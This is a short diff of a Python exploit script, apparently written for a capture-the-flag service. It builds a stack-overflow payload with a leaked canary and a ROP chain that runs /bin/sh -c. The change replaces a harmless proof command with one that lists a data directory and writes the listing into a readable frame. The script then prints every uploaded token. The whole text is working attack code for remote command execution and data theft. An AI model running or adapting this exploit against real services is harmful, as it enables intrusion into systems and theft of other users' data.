@@ -59,7 +59,7 @@ cmd = pad(b'/bin/sh\x00')
 argv = [
     pad(b'/bin/sh\x00'),
     pad(b'-c\x00'),
-    pad(f'echo "kek" > /tmp/proof\x00'.encode()),
+    pad(f'ls /anime > /anime/{token}/0.frame\x00'.encode()),
 ]
 
 rop = b""
@@ -93,3 +93,6 @@ rop += syscall
 payload_rce = p64(72 + len(rop)) + b"A" * 8 + b"\x00" + b"B" * 15 + canary + b"C" * 40 + rop
 
 mch.parse_frames(sess, [payload_rce])
+
+print('All uploaded tokens:')
+print(mch.get_frames(sess, token, 0, 0)[0].decode())
